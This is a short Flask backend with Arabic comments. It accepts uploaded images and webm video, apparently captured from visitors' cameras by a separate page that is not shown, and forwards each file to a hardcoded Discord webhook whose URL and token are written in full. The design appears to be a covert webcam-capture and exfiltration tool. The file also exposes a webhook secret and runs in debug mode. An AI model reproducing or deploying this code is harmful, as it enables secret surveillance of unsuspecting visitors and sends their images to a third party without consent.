# app.py
from flask import Flask, request, jsonify, send_file
import base64
import requests
from io import BytesIO
from PIL import Image

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1362553494988394757/pw4iKW76TUWd1pjYnfg6BpUv1_3X_RByXC52LJ0f91locIV95cdMDCWMccOOH5htPEtS"  # ← غيره بالرابط بتاعك


@app.route('/')
def home():
    return send_file("index.html")  # ← عرض الصفحة من الملف مباشرة


@app.route('/upload_image', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_data = data['image'].split(",")[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes))
        image.save("captured_image.png")

        with open('captured_image.png', 'rb') as image_file:
            files = {'file': ('captured_image.png', image_file, 'image/png')}
            response = requests.post(WEBHOOK_URL, files=files)

            if response.status_code == 204:
                return jsonify(
                    {'message': 'تم إرسال الصورة بنجاح إلى ديسكورد!'}), 200
            else:
                return jsonify(
                    {'message':
                     'حدث خطأ أثناء إرسال الصورة إلى ديسكورد!'}), 500
    except Exception as e:
        return jsonify({'message': f'خطأ أثناء معالجة الصورة: {str(e)}'}), 500


@app.route('/upload_video', methods=['POST'])
def upload_video():
    try:
        video = request.files['video']
        files = {'file': (video.filename, video, 'video/webm')}
        response = requests.post(WEBHOOK_URL, files=files)

        if response.status_code == 204:
            return jsonify({'message':
                            'تم إرسال الفيديو بنجاح إلى ديسكورد!'}), 200
        else:
            return jsonify(
                {'message': 'حدث خطأ أثناء إرسال الفيديو إلى ديسكورد!'}), 500
    except Exception as e:
        return jsonify({'message': f'خطأ أثناء إرسال الفيديو: {str(e)}'}), 500


if __name__ == '__main__':
    app.run(debug=True)
